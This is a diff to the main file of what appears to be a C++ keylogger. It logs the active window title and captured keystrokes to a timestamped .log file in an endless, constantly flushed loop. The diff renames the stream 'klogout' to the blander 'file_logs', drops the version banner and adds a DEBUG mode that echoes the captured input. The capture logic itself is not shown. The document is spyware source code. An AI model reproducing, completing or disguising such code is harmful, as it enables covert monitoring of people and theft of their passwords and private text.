@@ -1,13 +1,11 @@
 #include "stdafx.h"
-
 #include "main.h"
 
-int main(int argc, char *argv[]){
-	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
-	puts(PROJECT_COPYRIGHT);
-	puts("");
-	
-	
+#define FILEEXT ".log"
+#define DEBUG
+
+int main(int argc, char *argv[])
+{	
 	std::string basepath = dirBasename(getSelfPath());
 	
 	time_t rawtime;
@@ -17,14 +15,15 @@ int main(int argc, char *argv[]){
 	char filename[MAX_PATH];
 	char filepath[MAX_PATH];
 	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
-	//sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
 	sprintf_s(filepath, MAX_PATH, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
 	
-	//printf("filepath '%s'\n", filepath); exit(0);
-	
+#ifdef DEBUG
+	printf("Saving content to: filepath '%s'\n", filepath);
+#endif // DEBUG
+
 	
 	std::string lastTitle = "";
-	std::ofstream klogout(filepath);
+	std::ofstream file_logs(filepath);
 	
 	//SHORT lastc = 0;
 	while(1)
@@ -43,25 +42,25 @@ int main(int argc, char *argv[]){
 
 		if(lastTitle != title)
 		{
-			klogout << std::endl << std::endl << "Window: ";
+			file_logs << std::endl << std::endl << "Window: ";
 #ifdef DEBUG
 			std::cout << std::endl << std::endl << "Window: ";
 #endif
 			if(strlen(title) == 0)
 			{
-				klogout << "NO ACTIVE WINDOW";
+				file_logs << "NO ACTIVE WINDOW";
 #ifdef DEBUG
 				std::cout << "NO ACTIVE WINDOW";
 #endif
 			}
 			else
 			{
-				klogout << "'" << title << "'";
+				file_logs << "'" << title << "'";
 #ifdef DEBUG
 				std::cout << "'" << title << "'";
 #endif
 			}
-			klogout << std::endl;
+			file_logs << std::endl;
 #ifdef DEBUG
 			std::cout << std::endl;
 #endif
@@ -166,8 +165,8 @@ int main(int argc, char *argv[]){
 #ifdef DEBUG
 				std::cout << ">" << out << "< (" << (unsigned)c << ")" << std::endl;
 #endif
-				klogout << out;
-				klogout.flush();
+				file_logs << out;
+				file_logs.flush();
 				
 				//lastc = c;
 			}
@@ -175,7 +174,7 @@ int main(int argc, char *argv[]){
 		
 	}
 	
-	klogout.close();
+	file_logs.close();
 	
 	return 0;
 }
